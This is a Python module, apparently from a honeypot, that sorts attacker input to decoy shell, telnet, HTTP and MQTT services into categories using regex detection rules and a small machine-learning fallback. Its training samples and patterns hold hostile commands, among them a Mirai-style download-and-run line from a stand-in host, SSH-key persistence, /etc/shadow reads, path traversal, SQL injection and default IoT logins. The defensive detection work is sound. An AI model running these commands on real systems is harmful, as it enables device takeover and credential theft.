"""Attack classifier.

Hybrid design:

1. Deterministic rules run first. They use word boundaries, so ``id`` does
   not match ``android`` and ``ls`` does not match ``tools``.
2. If no rule matches, an optional scikit-learn model gets a vote, but only
   when it is confident enough. Otherwise the input is a ``general_probe``.

The model is trained on a tiny built-in sample set, so it is a tie-breaker
for unfamiliar input, never an override of an explicit rule.
"""

from __future__ import annotations

import logging
import re
import threading
from dataclasses import dataclass

from app.config import settings

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class ClassificationResult:
    classification: str
    risk_level: str
    source: str = "rule"


RISK_LEVELS = {
    "empty_or_unknown": "low",
    "general_probe": "low",
    "mqtt_probe": "medium",
    "web_admin_scan": "medium",
    "reconnaissance": "medium",
    "credential_attack": "medium",
    "exploit_attempt": "high",
    "system_tampering": "high",
    "malware_download_attempt": "high",
}

_SHELL_SERVICES = {"fake_shell", "fake_telnet"}


def _compile(*patterns: str) -> list[re.Pattern]:
    return [re.compile(pattern, re.IGNORECASE) for pattern in patterns]


_MALWARE = _compile(
    r"\b(wget|curl|tftp|ftpget|fetch)\b",
    r"\bbusybox\s+(wget|tftp|ftpget|nc)\b",
    r"\bchmod\s+(\+x|[0-7]*7[0-7]*)\b",
    r"\b(mirai|gafgyt|bashlite|mozi|hajime)\b",
    r"(^|[\s;&|])\./\S+",
    r"\b(sh|bash|ash)\s+\S+\.sh\b",
    r"/dev/tcp/",
    r"\bnc\b.*\s-e\s",
    r"\bbase64\s+(-d|--decode)\b",
)

_TAMPERING = _compile(
    r"\brm\s+-[a-z]*[rf]",
    r"\b(crontab|iptables|insmod|rmmod|mkfs|dd)\b",
    r"\b(kill|killall|pkill)\b",
    r"/etc/(shadow|rc\.local|init\.d|crontab)",
    r"(^|[\s;&|])(passwd|useradd|adduser|deluser)\b",
    r"authorized_keys",
    r">\s*/dev/(sd|mtd|null\s*2>&1)",
    r"\bhistory\s+-c\b",
)

_EXPLOIT = _compile(
    r"\.\./",
    r"%2e%2e",
    r"\(\)\s*\{",  # shellshock
    r"\$\{jndi:",  # log4shell
    r"[;&|`]\s*(wget|curl|sh|bash|nc|cat|id)\b",
    r"\$\((wget|curl|sh|bash|id)",
    r"\bunion\s+select\b",
    r"<script\b",
    r"/cgi-bin/",
    r"\b(shell|cmd|exec|command)=",
    r"/(boaform|goform|hnap1|gponform)\b",
)

_CREDENTIAL = _compile(
    r"\b(login_attempt|login_failed)\b",
    r"\bpassword=",
    r"\buser(name)?=\S+",
    r"\b(admin|root|user|guest|support):\S+",
)

_RECON = _compile(
    r"\b(whoami|uname|ifconfig|netstat|hostname|uptime|dmesg|lscpu|nproc|mount|df|free)\b",
    r"(^|[\s;&|])(id|ls|pwd|ps|w|env|top)($|[\s;&|])",
    r"\bip\s+(addr|a|route|link)\b",
    r"\bcat\s+/(etc|proc)/",
    r"\b(nmap|masscan|zmap)\b",
)

_WEB_SCAN = _compile(
    r"/(admin|login|manager|console|setup)\b",
    r"wp-(admin|login)",
    r"phpmyadmin",
    r"\.(env|git|php|cgi|asp|bak|sql)\b",
    r"/(config|backup|actuator|solr|jenkins)\b",
)

_MQTT = _compile(
    r"\bmqtt\b",
    r"\b(connect|subscribe|publish|pingreq|unsubscribe)\b",
    r"\b(topic|client_id)=",
)


# Shell housekeeping that says nothing about intent. Matched as the whole
# input, so the model never gets to guess at it.
_BENIGN_SHELL = re.compile(
    r"^(exit|quit|logout|help|\?|clear|enable|shell|sh|system|linuxshell|true|status|version)$",
    re.IGNORECASE,
)


def _matches(patterns: list[re.Pattern], text: str) -> bool:
    return any(pattern.search(text) for pattern in patterns)


def _result(classification: str, source: str = "rule") -> ClassificationResult:
    return ClassificationResult(classification, RISK_LEVELS.get(classification, "low"), source)


def rule_based_classify(raw_input: str, service: str = "unknown") -> ClassificationResult | None:
    """Return a classification, or ``None`` when no rule applies."""
    text = (raw_input or "").strip()
    if not text:
        return _result("empty_or_unknown")

    if service == "fake_mqtt":
        if _matches(_MALWARE, text) or _matches(_EXPLOIT, text):
            return _result("exploit_attempt")
        if _matches(_CREDENTIAL, text):
            return _result("credential_attack")
        if _matches(_MQTT, text):
            return _result("mqtt_probe")
        return None

    if service == "http":
        # Order matters: a login POST is a credential attack even though the
        # path contains /login.
        if _matches(_EXPLOIT, text):
            return _result("exploit_attempt")
        if re.search(r"\b(wget|curl)\b.*https?://", text, re.IGNORECASE):
            return _result("malware_download_attempt")
        if _matches(_CREDENTIAL, text):
            return _result("credential_attack")
        if _matches(_WEB_SCAN, text):
            return _result("web_admin_scan")
        return None

    # Shell-like services and anything unknown.
    if _BENIGN_SHELL.match(text):
        return _result("general_probe")
    if _matches(_MALWARE, text):
        return _result("malware_download_attempt")
    if _matches(_TAMPERING, text):
        return _result("system_tampering")
    if _matches(_CREDENTIAL, text):
        return _result("credential_attack")
    if _matches(_RECON, text):
        return _result("reconnaissance")
    if service not in _SHELL_SERVICES and _matches(_MQTT, text):
        return _result("mqtt_probe")
    return None


# --------------------------------------------------------------------------
# Optional ML tie-breaker
# --------------------------------------------------------------------------

TRAINING_SAMPLES = [
    ("fake_shell wget http://bad-host/bot.sh", "malware_download_attempt"),
    ("fake_shell curl -O http://example.com/payload", "malware_download_attempt"),
    ("fake_shell chmod +x update.sh", "malware_download_attempt"),
    ("fake_shell busybox tftp -g -r payload 10.0.0.5", "malware_download_attempt"),
    ("fake_shell ftpget 10.0.0.5 bot bot", "malware_download_attempt"),
    ("fake_shell cd /tmp; wget http://1.2.3.4/arm7; chmod 777 arm7; ./arm7", "malware_download_attempt"),
    ("fake_telnet /bin/busybox MIRAI", "malware_download_attempt"),
    ("fake_shell sh install.sh", "malware_download_attempt"),
    ("fake_shell rm -rf /tmp/*", "system_tampering"),
    ("fake_shell iptables -F", "system_tampering"),
    ("fake_shell killall telnetd", "system_tampering"),
    ("fake_shell echo ssh-rsa AAAA >> /root/.ssh/authorized_keys", "system_tampering"),
    ("fake_shell cat /etc/shadow", "system_tampering"),
    ("fake_shell crontab -e", "system_tampering"),
    ("http admin:admin password=admin", "credential_attack"),
    ("http root:root password=root", "credential_attack"),
    ("http root:123456 password=123456", "credential_attack"),
    ("http login_attempt username=admin", "credential_attack"),
    ("fake_telnet login_attempt username=root password=xc3511", "credential_attack"),
    ("fake_mqtt connect username=admin password=public", "credential_attack"),
    ("fake_shell whoami", "reconnaissance"),
    ("fake_shell id", "reconnaissance"),
    ("fake_shell uname -a", "reconnaissance"),
    ("fake_shell ifconfig", "reconnaissance"),
    ("fake_shell ip addr", "reconnaissance"),
    ("fake_shell netstat -an", "reconnaissance"),
    ("fake_shell ps aux", "reconnaissance"),
    ("fake_shell cat /etc/passwd", "reconnaissance"),
    ("fake_shell cat /proc/cpuinfo", "reconnaissance"),
    ("fake_shell ls -la /tmp", "reconnaissance"),
    ("http GET /admin", "web_admin_scan"),
    ("http GET /login", "web_admin_scan"),
    ("http GET /wp-admin", "web_admin_scan"),
    ("http GET /phpmyadmin", "web_admin_scan"),
    ("http GET /config.php", "web_admin_scan"),
    ("http GET /.env", "web_admin_scan"),
    ("http GET /setup.cgi", "web_admin_scan"),
    ("http GET /cgi-bin/../../etc/passwd", "exploit_attempt"),
    ("http GET /shell?cmd=cat /etc/passwd", "exploit_attempt"),
    ("http POST /boaform/admin/formLogin", "exploit_attempt"),
    ("http GET /index.php?id=1 union select 1,2,3", "exploit_attempt"),
    ("fake_mqtt connect client_id=scanner", "mqtt_probe"),
    ("fake_mqtt subscribe topic=sensors/temperature", "mqtt_probe"),
    ("fake_mqtt subscribe topic=#", "mqtt_probe"),
    ("fake_mqtt publish topic=camera/status", "mqtt_probe"),
    ("fake_mqtt pingreq", "mqtt_probe"),
    ("http GET /", "general_probe"),
    ("http GET /favicon.ico", "general_probe"),
    ("http GET /robots.txt", "general_probe"),
    ("fake_shell help", "general_probe"),
    ("fake_shell status", "general_probe"),
    ("fake_shell version", "general_probe"),
    ("fake_telnet enable", "general_probe"),
    ("fake_shell echo hello", "general_probe"),
    ("unknown random tcp payload", "general_probe"),
]

_model = None
_model_loaded = False
_model_lock = threading.Lock()


def _get_model():
    """Train the model on first use. Returns ``None`` if ML is unavailable."""
    global _model, _model_loaded
    if _model_loaded:
        return _model

    with _model_lock:
        if _model_loaded:
            return _model
        if settings.use_ml:
            try:
                from sklearn.feature_extraction.text import TfidfVectorizer
                from sklearn.linear_model import LogisticRegression
                from sklearn.pipeline import Pipeline

                model = Pipeline(
                    [
                        (
                            "tfidf",
                            TfidfVectorizer(
                                analyzer="char_wb", ngram_range=(2, 4), sublinear_tf=True
                            ),
                        ),
                        ("classifier", LogisticRegression(C=10.0, max_iter=1000)),
                    ]
                )
                model.fit(
                    [sample for sample, _ in TRAINING_SAMPLES],
                    [label for _, label in TRAINING_SAMPLES],
                )
                _model = model
                logger.info("ML classifier ready (%d samples)", len(TRAINING_SAMPLES))
            except ImportError:
                logger.warning("scikit-learn not installed; using rule-based classifier only")
            except Exception:  # noqa: BLE001 - never let the model break a decoy
                logger.exception("ML classifier failed to train; using rules only")
        _model_loaded = True
        return _model


def warm_up() -> None:
    """Train the model at startup instead of on the first attacker."""
    _get_model()


def classify_input(raw_input: str, service: str = "unknown") -> ClassificationResult:
    text = (raw_input or "").strip()
    if not text:
        return _result("empty_or_unknown")

    # Bound the work an attacker can force per event.
    text = text[: settings.max_raw_input_chars]

    ruled = rule_based_classify(text, service=service)
    if ruled is not None:
        return ruled

    model = _get_model()
    if model is not None:
        try:
            probabilities = model.predict_proba([f"{service} {text.lower()}"])[0]
            best = probabilities.argmax()
            if probabilities[best] >= settings.ml_min_confidence:
                return _result(str(model.classes_[best]), source="ml")
        except Exception:  # noqa: BLE001
            logger.exception("ML prediction failed; falling back to general_probe")

    return _result("general_probe", source="default")
